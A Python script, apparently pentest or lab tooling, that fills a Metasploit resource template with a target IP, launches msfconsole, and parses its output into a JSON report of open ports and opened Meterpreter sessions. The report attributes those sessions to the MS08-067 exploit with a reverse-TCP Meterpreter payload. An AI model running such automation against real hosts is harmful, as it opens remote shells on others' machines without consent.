import os
import subprocess
import re
import json
import datetime

BASE = "/msf"
TEMPLATE_RC = os.path.join(BASE, "scan_template.rc")
AUTO_RC     = os.path.join(BASE, "scan_auto.rc")
RESULTS_DIR = os.path.join(BASE, "results")

def generate_rc_file(ip):
    with open(TEMPLATE_RC, 'r') as f:
        content = f.read()
    content = content.replace("__TARGET_IP__", ip)
    with open(AUTO_RC, 'w') as f:
        f.write(content)
    print(f"[+] Fichier RC généré avec IP : {ip}")
    return AUTO_RC

def run_msfconsole(rc_path):
    os.makedirs(RESULTS_DIR, exist_ok=True)
    spool = os.path.join(RESULTS_DIR, "spool.txt")
    print("[*] Lancement de Metasploit...")
    cmd = [
        "ruby",
        "/opt/metasploit-framework/msfconsole",
        "-q",
        "-r", rc_path
    ]
    with open(spool, 'w') as out:
        subprocess.run(cmd, stdout=out, stderr=subprocess.STDOUT)
    print(f"[+] Spool enregistré dans : {spool}")
    return spool

def parse_spool_to_json(spool_path, ip):
    with open(spool_path, 'r') as f:
        lines = f.readlines()

    scans = []
    exploits = []
    for l in lines:
        h = re.search(r'Host: (\d+\.\d+\.\d+\.\d+)', l)
        p = re.search(r'Port: (\d+)/tcp', l)
        s = re.search(r'State: (\w+)', l)
        svc = re.search(r'Service: (\w+)', l)
        m = re.search(r'\[\*\] Meterpreter session (\d+) opened.*?(\d+\.\d+\.\d+\.\d+)', l)
        u = re.search(r'Username\s+:\s+(\w+)', l)
        plt = re.search(r'Platform\s+:\s+(\w+)', l)

        if h and p and s:
            scans.append({
                "host": h.group(1),
                "port": int(p.group(1)),
                "state": s.group(1),
                "service": svc.group(1) if svc else ""
            })
        if m:
            exploits.append({
                "module": "ms08_067_netapi",
                "payload": "windows/meterpreter/reverse_tcp",
                "session_id": int(m.group(1)),
                "host": m.group(2),
                "user": u.group(1) if u else None,
                "platform": plt.group(1) if plt else None
            })

    report = {
        "target": ip,
        "scan": scans,
        "exploits": exploits
    }
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    outf = os.path.join(RESULTS_DIR, f"result-{ip.replace('.', '_')}-{ts}.json")
    with open(outf, 'w') as j:
        json.dump(report, j, indent=2)
    print(f"[+] Rapport JSON écrit dans : {outf}")
    return outf

def main():
    ip = os.environ.get("TARGET_IP")
    if not ip:
        print("❌ Pas d'IP cible dans TARGET_IP ! Abandon.")
        return

    rc = generate_rc_file(ip)
    spool = run_msfconsole(rc)
    parse_spool_to_json(spool, ip)

if __name__ == "__main__":
    main()
